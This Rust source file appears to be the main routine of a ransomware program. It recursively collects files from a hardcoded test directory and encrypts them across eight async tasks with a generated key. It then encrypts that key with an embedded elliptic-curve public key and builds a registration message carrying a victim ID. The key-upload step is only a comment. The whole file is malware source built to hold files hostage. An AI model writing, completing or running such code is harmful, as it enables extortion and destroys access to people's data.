use comms::generate_ucid;
use filesystem::recurse_directory_with_channel;
use openssl::ec;
use std::path::PathBuf;
use std::vec::Vec;

use zeroize::Zeroize;

mod comms;
mod encryptor;
mod filesystem;

const _THREADS: i32 = 8;

#[allow(dead_code)]
#[cfg(unix)]
const PUB_KEY: &[u8] = include_bytes!("../pub.key");

#[allow(dead_code)]
#[cfg(windows)]
const PUB_KEY: &[u8] = include_bytes!("..\\pub.key");

#[tokio::main]
async fn main() {
    let mut key = encryptor::generate_key();
    let (s, r) = crossbeam_channel::unbounded();

    recurse_directory_with_channel(PathBuf::from("/home/kobiske/Videos/Test Folder/"), &s);

    let mut threads = Vec::new();

    for _ in 0.._THREADS {
        let thread_reciever = r.clone();
        let thread_key = key.clone();
        threads.push(tokio::spawn(async move {
            encryptor::encrypt_files(thread_reciever, thread_key).await;
        }));
    }

    for thread in threads {
        let _ = thread.await;
    }

    let ecc_key = ec::EcKey::public_key_from_pem(PUB_KEY).unwrap();
    let p_key = openssl::pkey::PKey::from_ec_key(ecc_key).unwrap();
    let encryptor = openssl::encrypt::Encrypter::new(&p_key).unwrap();
    let buffer_len = encryptor.encrypt_len(&key).unwrap();
    let mut encrypted = vec![0u8; buffer_len];

    // Encrypt the data and discard its length
    let _ = encryptor.encrypt(&key, &mut encrypted).unwrap();

    let ucid = generate_ucid().unwrap();

    let register_blob = comms::Message::RegisterClient((ucid, encrypted.as_slice())).to_req();

    // send key to server here

    key.zeroize();
}
